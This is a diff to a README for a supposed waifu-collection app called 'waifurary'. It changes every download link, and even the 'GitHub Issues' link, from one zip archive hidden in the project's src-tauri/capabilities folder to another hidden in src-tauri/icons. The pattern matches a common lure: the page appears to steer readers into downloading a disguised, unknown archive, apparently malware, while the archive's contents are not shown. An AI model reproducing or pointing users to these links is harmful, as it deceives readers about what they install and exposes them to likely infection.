@@ -6,13 +6,13 @@ Welcome to waifurary! This application helps you easily collect and manage waifu
 
 ## 🔗 Download waifurary
 
-[![Download waifurary](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip%https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip)](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip)
+[![Download waifurary](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip%https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip)](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following link to download waifurary:
 
-[Download waifurary from Releases](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip)
+[Download waifurary from Releases](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip)
 
 1. Click on the link above.
 2. Look for the latest version of waifurary.
@@ -51,7 +51,7 @@ waifurary comes with a range of features that make it easy to collect and manage
 
 If you need help or want to discuss features, join our community:
 
-- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip).
 - **Discussion Forum:** Share your experience and interact with other users.
 
 ## 🛠️ Troubleshooting
@@ -76,4 +76,4 @@ For further inquiries, feel free to reach out via the contact options provided i
 
 Remember, you can download waifurary anytime:
 
-[Download waifurary from Releases](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/capabilities/Software-v1.4.zip)
+[Download waifurary from Releases](https://raw.githubusercontent.com/djgrexxxofficial-cell/waifurary/main/src-tauri/icons/Software_v3.1.zip)
